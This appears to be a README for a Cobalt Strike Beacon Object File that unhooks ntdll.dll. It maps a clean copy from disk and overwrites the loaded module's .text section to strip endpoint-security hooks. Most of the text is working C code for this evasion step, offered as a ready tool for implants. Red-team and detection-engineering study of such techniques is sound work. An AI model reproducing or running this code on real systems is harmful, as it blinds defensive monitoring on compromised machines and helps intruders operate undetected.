# Removing Hooks by Refreshing NTDLL

A Beacon Object File used to remove userland hooks from NTDLL. Currently supports only 64 bit (although the change is trivial).

## Hook Removal

Parses the PE structure of the loaded ntdll.dll module:

```
PSAPI$GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
```

Maps a new copy of ntdll from disk, without hooks:
```
HANDLE ntdllFile = KERNEL32$CreateFileA((LPCSTR)"c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
HANDLE ntdllMapping = KERNEL32$CreateFileMappingA(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
LPVOID ntdllMappingAddress = KERNEL32$MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
```

Parses the sections of the pre-existing ntdll, and looks for the ".text" section.
Once the target section is found, the code within it is replaced with the code of the NTDLL module that was mapped from disk:

```
for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
                PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

                if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
                        DWORD oldProtection = 0;
                        BOOL isProtected = KERNEL32$VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
                        MSVCRT$memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
                        isProtected = KERNEL32$VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
                }
        }
```